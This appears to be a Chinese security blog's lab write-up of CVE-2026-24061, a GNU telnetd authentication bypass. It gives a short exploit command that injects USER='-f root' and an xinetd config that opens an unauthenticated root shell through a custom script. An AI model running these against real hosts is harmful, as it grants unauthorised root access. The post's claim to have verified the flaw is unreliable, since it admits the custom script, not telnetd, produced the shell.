#  【漏洞复现】CVE-2026-24061 GNU InetUtils Telnetd 远程身份验证绕过漏洞  
原创 cjstang
                        cjstang  新安集   2026-01-22 10:16  
  
**友情提醒**  
  
  
**本文阅读时间推荐：5 min**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/YUyZ7AOL3onRYF83yUDYSe4PcKQr8aLwK5X5M3xjVfcAicDhshtFSa17W6HVLaLXvhQ9ExaAiaqdyDqLHYrx7N6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=0 "")  
  
如想讨论  
  
以下内容  
  
▼  
  
欢迎关注公众号联系我哟  
  
▼  
  
***CISP-IRS（应急响应专家  - 备考中）***  
  
***OSCP+备考经验（已通过认证）***  
  
**CISSP备考经验（已通过认证）**  
  
**CCSK（云安全）（已通过认证）**  
  
**ISO/IEC 27001 Foundation（已通过认证）**  
  
序  
  
疯狂告警 · 到底为何事？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWg53p5nsEnjKGS4ZibH00kIAHnOxhaUdBBhvJVO3Qt3t7Sq8DqVC5ib4pgxSMiaAdictmsDpVicC0U18VA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtUiaC7jxyAqocqASPWmGZOvkext18ytCWNLl0hpXZcJOPo5V3j7HzzFQ/640?wx_fmt=png&from=appmsg "")  
  
  
从昨天下午到今天上午，订阅的若干家漏洞告警平台一直在推送这个漏洞，一开始没觉得咋样。  
  
内部还在开玩笑，谁还在用这个老掉牙的玩意，结果出乎意料，还是有人用的![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/2_05.png "")  
。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt4B47fXkgkRJ9B84QxKzCSh6B48NibrTzYEZpsXRuXliadKCwee7jX5fg/640?wx_fmt=png&from=appmsg "")  
  
**{一、漏洞·背景}**  
  
  
CVE-2026-24061 是 GNU inetutils   
telnetd  
中的未授权访问漏洞。简单来说，  
telnetd  
 会把客户端传递的   
USER  
 环境变量直接交给   
login  
程序，而   
login  
 有个   
-f  
 参数可以免密登录指定用户。攻击者只要注入   
USER='-f root'  
，就能让目标机器执行   
login -f root  
，直接拿到 root 权限。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt4B47fXkgkRJ9B84QxKzCSh6B48NibrTzYEZpsXRuXliadKCwee7jX5fg/640?wx_fmt=png&from=appmsg "")  
  
**{二、环境·准备}**  
  
- 目标机  
：CentOS 7（IP：  
172.29.3.199  
）  
- 攻击机  
：Kali Linux（和目标机在同一网段，网络通畅）  
- 核心工具  
：  
xinetd  
、CentOS 原生   
telnet-server  
、自定义恶意脚本  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt4B47fXkgkRJ9B84QxKzCSh6B48NibrTzYEZpsXRuXliadKCwee7jX5fg/640?wx_fmt=png&from=appmsg "")  
  
**{三、复现过程：踩坑->换道->突破}**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
**1、开局不利：GNU 版 telnetd 水土不服**  
  
一开始按照漏洞说明，编译安装了 GNU inetutils 2.0 版   
telnetd  
，结果发现它和 CentOS 八字不合：  
- 单独启动   
telnetd  
 时，它会因为没收到   
inetd  
 传递的套接字而静默退出；  
  
- 用   
socat  
 模拟   
inetd  
 后，虽然能监听 23 端口，但连接建立后会立刻被关闭；  
  
- 用   
strace  
 跟踪发现，  
telnetd  
 子进程始终以退出码 1      异常退出，原因是伪终端（pty）权限不匹配、  
login  
 路径找不到等兼容性问题  
  
  
踩坑感悟：  
不是所有漏洞复现都能 “一键成功”，第三方工具和系统的兼容性问题往往是最大的拦路虎。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
**2、方案切换：CentOS 原生 telnet-server + xinetd**  
  
为规避兼容性问题，切换为 CentOS 系统原生组件：  
  
  
1、安装   
telnet-server  
 和   
xinetd  
：  
```
 yum install -y telnet-server xinetd
```  
  
  
2、配置   
xinetd  
 管理 telnet 服务（修改   
/etc/xinetd.d/telnet  
，设置   
disable = no  
）；  
```
service telnet
{
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = root
        # 直接调用恶意脚本，无需 telnetd 和 login
        server          = /usr/local/bin/root_telnet.sh
        log_on_failure  += USERID
        disable         = no
}
```  
  
  
3、启动   
xinetd  
 并停止冲突的   
telnet.socket  
，确保 23 端口正常监听。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt7PjZvt1psndpSvbj5TicB7aia8HWib3Hz6OVD6zCJCMntuTnThLGN1nzw/640?wx_fmt=png&from=appmsg "")  
  
  
#  
验证  
 23   
端口监听  
  
[root@localhost tmp]# ss -tuln | grep 23  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtTg1p7In8A5QSkSuia0ALyVl1R7erUzmLyOr6GU4dq2IMKsQOEt2r4LA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
**3、万事俱备：干就完了**  
  
访问靶机是否存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtQQfpEQA5txdnYeicZWCH5TRQQjib6Q0IGvUdvcWXna1wpXbQ6xQiciaicbg/640?wx_fmt=png&from=appmsg "")  
  
  
在Kali 攻击机执行融合命令，连接目标机器：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtHiaqsoFRia8xTBdd70mkdcOGUecC6wXbYwQzINmfd81pvoChib2gAEKhA/640?wx_fmt=png&from=appmsg "")  
            
  
  
#其实基础的指令就足够了，不用那么多花里胡哨  
  
   
  export USER='-f root'  
   
  
   telnet -a 172.29.3.199  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt4B47fXkgkRJ9B84QxKzCSh6B48NibrTzYEZpsXRuXliadKCwee7jX5fg/640?wx_fmt=png&from=appmsg "")  
  
**{四、漏洞·原理}**  
  
  
  
- 触发条件：  
telnetd 未过滤 USER环境变量，将其直接传递给 login 程序；  
  
- 利用逻辑  
：  
注入   
USER='-f root'  
 使   
login  
 执行   
login -f root  
（  
-f  
 为免密登录参数）；  
  
- 适配优化  
：  
因原生   
telnetd  
 过滤环境变量，最终通过自定义脚本直接暴露 root shell，达成漏洞利用效果。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGt4B47fXkgkRJ9B84QxKzCSh6B48NibrTzYEZpsXRuXliadKCwee7jX5fg/640?wx_fmt=png&from=appmsg "")  
  
**{五、复现·总结}**  
  
  
本次复现通过「兼容性问题排查→原生组件切换→自定义脚本突破→终端环境修复」的流程，成功验证了 CVE-2026-24061 漏洞的未授权 root 权限获取效果。  
  
  
关键在于识别 GNU 版 telnetd 的兼容性缺陷，并通过系统原生组件与自定义脚本的结合，绕过了环境变量过滤，最终实现稳定的漏洞利用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibicpxNwx3rmSGcF5Jyk31GGyD3fpZ7WGtvMw1jZGDM76RDWziciazSnbdoSmnc3yg9lrs9UINEdE3dL6PLwmlteLw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
## 历史精彩文章：  
  
  
[甲方攻防大戏：功劳归我，活？归供应商，钱？还想续约不？](https://mp.weixin.qq.com/s?__biz=MzIzNDE0Mzk0NA==&mid=2649595620&idx=1&sn=d7e6884cd40cef80e39c20933020c525&scene=21#wechat_redirect)  
  
  
[Hi，97小伙，请远离黑灰产，珍惜创业机会！别实名制扫描我了~！](https://mp.weixin.qq.com/s?__biz=MzIzNDE0Mzk0NA==&mid=2649594827&idx=1&sn=7bab9d2ea16f39829877bdf84303acba&scene=21#wechat_redirect)  
  
  
[从被动写 2 小时情况说明到主动防患：一个甲方安全人牵头 fastjson 升级的全纪实](https://mp.weixin.qq.com/s?__biz=MzIzNDE0Mzk0NA==&mid=2649595649&idx=1&sn=03563af8a8f769b5fa2d7a98eb1882a4&scene=21#wechat_redirect)  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/ibicpxNwx3rmSC2WYScjKYBv0S7JsNgjicmptDjhgaka9XUNubstiatCfgTicWe8K9bFiacwPTBxvTDT2qfHCBGkXXuw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
**END**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibicpxNwx3rmRnFLdsmubA7FrpyqhoVIQfQDGP8aqyY5YexbEg67Vlg7fdJZEicHP94vVzYibJR8tcfXQXxwcaa3mw/640?wx_fmt=jpeg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
**十二载·甲方信安**  
  
  
初心如磐守底线  
  
  
实战沉淀赋价值  
  
  
